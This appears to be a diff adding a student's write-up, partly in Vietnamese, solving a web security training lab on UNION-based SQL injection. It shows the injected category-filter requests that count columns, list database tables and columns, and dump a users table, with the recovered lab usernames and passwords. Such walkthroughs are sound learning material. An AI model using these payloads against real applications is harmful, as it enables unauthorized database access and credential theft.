@@ -1,0 +1,57 @@
+This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+Database contents
+You can list the tables that exist in the database, and the columns that those tables contain.
+
+Oracle	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+Microsoft	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+PostgreSQL	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+MySQL	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+
+1. Xác định có bao nhiêu cột
+GET /filter?category='+union+select+null,null-- HTTP/1.1
+-> có 2 cột
+2. Xác định kiểu dữ liệu của 2 cột
+GET /filter?category='+union+select+'asdf','test'-- HTTP/1.1
+-> cả 2 cột có kiểu dữ liệu text
+3. Database contents
+You can list the tables that exist in the database, and the columns that those tables contain.
+
+Oracle	SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+Microsoft	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+PostgreSQL	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+MySQL	SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+
+Xác định xem db có bao nhiêu bảng
+-> GET /filter?category='+union+select+table_name,null+from+information_schema.tables-- HTTP/1.1
+-> ra rất nhiều tên bảng trong đó có bảng 'users_azgndn'
+
+4. lấy cột từ bảng 'users_azgndn'
+' union select column_name,null from information_schema.columns where table_name='users_azgndn'--
+-> lấy được 2 cột
+password_tajvdi
+username_txpvea
+
+5. lấy nội dung của 2 cột password_tajvdi và username_txpvea từ bảng users_azgndn
+' union select username_txpvea,password_tajvdi from users_azgndn--
+->carlos
+3bb1cslqts8j7ehgkvyq
+wiener
+utfw0daz0zor129gwbh8
+administrator
+sud34f4ojf1jsxrdi9d7
+
+Đăng nhập thôi
